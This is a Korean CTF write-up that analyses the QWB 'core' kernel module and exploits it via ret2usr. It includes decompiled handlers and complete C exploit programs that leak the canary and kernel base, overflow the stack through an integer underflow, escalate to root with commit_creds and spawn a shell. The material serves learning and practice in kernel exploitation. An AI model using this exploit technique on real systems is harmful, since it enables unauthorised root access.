# 1. 분석

ret2usr 연습용으로 좋은 문제라고 들어서 시도해본다.

core_give.tar.gz를 받아서 압축을 해제한다.

다음 명령어를 통해 파일 시스템 압축을 해제한다.

```bash
mkdir rootfs
mv ./core.cpio ./rootfs
cd rootfs
mv core.cpio core.gz
gzip -d core.gz
cpio -id -v < core
```

ko 파일을 IDA로 열어보자.

```c
__int64 init_module()
{
  core_proc = proc_create("core", 438LL, 0LL, &core_fops);
  printk(&unk_2DE);
  return 0LL;
}
```

해당 커널 모듈이 로드되고 가장 처음 실행되는 함수. /proc/core 엔트리를 만든다.

```c
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);
      break;
    case 0x6677889C:
      printk(&unk_2CD);
      off = a3;
      break;
    case 0x6677889A:
      printk(&unk_2B3);
      core_copy_func(a3);
      break;
  }
  return 0LL;
}
```

ioctl 함수로 이 모듈과 상호작용을 할 수 있게 해주는 함수이다. 인자에 따라 옵션을 선택할 수 있다. 공격자가 off 변수를 원하는 값으로 세팅할 수 있다.

```c
unsigned __int64 __fastcall core_read(__int64 a1)
{
  char *v2; // rdi
  __int64 i; // rcx
  unsigned __int64 result; // rax
  char v5[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v6; // [rsp+40h] [rbp-10h]

  v6 = __readgsqword(0x28u);
  printk(&unk_25B);
  printk(&unk_275);
  v2 = v5;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)v2 = 0;
    v2 += 4;
  }
  strcpy(v5, "Welcome to the QWB CTF challenge.\n");
  result = copy_to_user(a1, &v5[off], 64LL);
  if ( !result )
    return __readgsqword(0x28u) ^ v6;
  __asm { swapgs }
  return result;
}
```

copy_to_user 함수를 사용해 커널 메모리를 사용자 메모리로 복사하고 있다. 그런데 여기서 off 변수를 사용한다. 이 변수는 공격자가 임의로 조작가능 하기 때문에 OOB Read가 발생한다.

```c
__int64 __fastcall core_copy_func(__int64 a1)
{
  __int64 result; // rax
  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF

  v2[8] = __readgsqword(0x28u);
  printk(&unk_215);
  if ( a1 > 63 )
  {
    printk(&unk_2A1);
    return 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(v2, &name, (unsigned __int16)a1);
  }
  return result;
}
```

함수의 인자로 받는 a1은 signed 이지만, qmemcpy에서는 unsinged로 캐스팅을 해서 사용하고 있다. → 인티저 언더플로우가 발생한다.

따라서 name에 원하는 값을 넣는다면 qmemcpy가 수행될 때 버퍼 오버 플로우를 통해 실행 흐름을 조작할 수 있다.

버퍼 오버 플로우를 제대로 활용하려면 카나리를 올바르게 덮어야하기 때문에 base 주소 말고도 카나리를 릭할 필요가 있다.

```c
__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  printk(&unk_215);
  if ( a3 <= 0x800 && !copy_from_user(&name, a2, a3) )
    return (unsigned int)a3;
  printk(&unk_230);
  return 4294967282LL;
}
```

이 함수에서 name 변수에 공격자가 원하는 값을 넣을 수 있다.

# 2. 디버깅

```c
unsigned __int64 __fastcall core_read(__int64 a1)
{
  char *v2; // rdi
  __int64 i; // rcx
  unsigned __int64 result; // rax
  char v5[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v6; // [rsp+40h] [rbp-10h]

  v6 = __readgsqword(0x28u);
  printk(&unk_25B);
  printk(&unk_275);
  v2 = v5;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)v2 = 0;
    v2 += 4;
  }
  strcpy(v5, "Welcome to the QWB CTF challenge.\n");

```

이 함수에서 v5 는 rbp-0x50에 위치하고, v6(카나리)는 rbp-0x10에 존재한다. 따라서 offset = 0x40이다.

이게 실제로 맞는지 확인해보자.

이제 kbase를 릭해보자 카나리 오프셋에서 0x8*4 를 더해주니까 kernel 코드 영역의 주소를 릭할 수 있었다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define CORE_READ 0x6677889B
#define CORE_OFF 0x6677889C
#define CORE_COPY_FUNC 0x6677889A

void print_addr(char *arr){
    for(int i = 0 ; i < 8 ; i++){
        printf("%02x ",arr[i] & 0xff);
    }
    printf("\n");
}

int main(){
    char buf[0x100] = {0, };
    char canary[0x8] = {0, };
    char kbase[0x8] = {0, };
    unsigned long tmp = 0;

    int fd = open("/proc/core",O_RDWR);

    if(fd == NULL) {
        printf("Can't open core!\n");
        exit(-1);
    }

    printf("Canary leaking...\n");
    ioctl(fd,CORE_OFF,0x40);
    ioctl(fd,CORE_READ,buf);
    memcpy(canary,buf,0x8);
    printf("Canary : ");
    print_addr(canary);

    printf("Kernel_base leaking...\n");
    ioctl(fd,CORE_OFF,0x40+(0x8*4));
    ioctl(fd,CORE_READ,buf);
    memcpy(kbase,buf,0x8);

    memcpy(&tmp,kbase,sizeof(tmp));
    tmp -= 0x1dd6d1;
    memcpy(kbase,&tmp,sizeof(tmp));

    printf("kbase : ");
    print_addr(kbase);

    return 0;
}
```

# 3. 익스플로잇

write를 통해 name 변수에 페이로드를 넣고, copy의 인티저 언더 플로를 이용한 버퍼 오버 플로를 활용해서 rip를 조작한다. 인터넷 찾아보니까 그냥 심볼 읽어서 주소 가져오던데 나는 정직하게 커널 주소 릭해서 오프셋 계산 하는 방식으로 풀어보겠다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define CORE_READ 0x6677889B
#define CORE_OFF 0x6677889C
#define CORE_COPY_FUNC 0x6677889A

void *(*prepare_kernel_cred)(void *);
int (*commit_cred)(void *);
uint64_t dummy_stack[1024] __attribute__((aligned(16)));

void print_addr(char *arr){
    for(int i = 0 ; i < 8 ; i++){
        printf("%02x ",arr[i] & 0xff);
    }
    printf("\n");
}

void shell(){
    printf("Get shell.\n");
    system("/bin/sh");
}

void ret2usr(){
    static struct trap_frame {
        void *rip;
        uint64_t cs;
        uint64_t rflags;
        void *rsp;
        uint64_t ss;
    } tf = {
        .rip = &shell,
        .cs = 0x33,
        .rflags = 0x202,
        .rsp = dummy_stack + 1024,
        .ss = 0x2b
    };
    volatile register uint64_t RSP asm("rsp");
    commit_cred(prepare_kernel_cred(0));
    RSP = (uint64_t)&tf;

    asm volatile(
        "cli\n\t"
        "swapgs\n\t"
        "iretq"
        :: "r" (RSP)
    );

}

int main(){
    char buf[0x100] = {0, };
    char canary[0x8] = {0, };
    char k_leak[0x8] = {0, };
    char payload[0x100] = {0, };
    unsigned long kbase = 0;

    int fd = open("/proc/core",O_RDWR);

    if(fd == NULL) {
        printf("Can't open core!\n");
        exit(-1);
    }

    printf("Canary leaking...\n");
    ioctl(fd,CORE_OFF,0x40);
    ioctl(fd,CORE_READ,buf);
    memcpy(canary,buf,0x8);
    printf("Canary : ");
    print_addr(canary);

    printf("Kernel_base leaking...\n");
    ioctl(fd,CORE_OFF,0x40+(0x8*4));
    ioctl(fd,CORE_READ,buf);
    memcpy(k_leak,buf,0x8);

    memcpy(&kbase,k_leak,sizeof(kbase));
    kbase -= 0x1dd6d1;

    prepare_kernel_cred = kbase + 0x0009cce0;
    commit_cred = kbase + 0x0009c8e0;

    printf("kbase : 0x%lx\n",kbase);
    printf("prepare kernel cred : 0x%lx\n",prepare_kernel_cred);
    printf("commit_cred : 0x%lx\n",commit_cred);

    memset(payload,'a',0x40);
    memcpy(payload+0x40,canary,0x8);
    memset(payload+0x48,'a',0x8);
    *(uint64_t *)(payload+0x50)= (uint64_t)ret2usr;

    write(fd,payload,0x58);
    ioctl(fd,CORE_COPY_FUNC,0xffffffffffff0000|sizeof(payload));
    return 0;
}

```
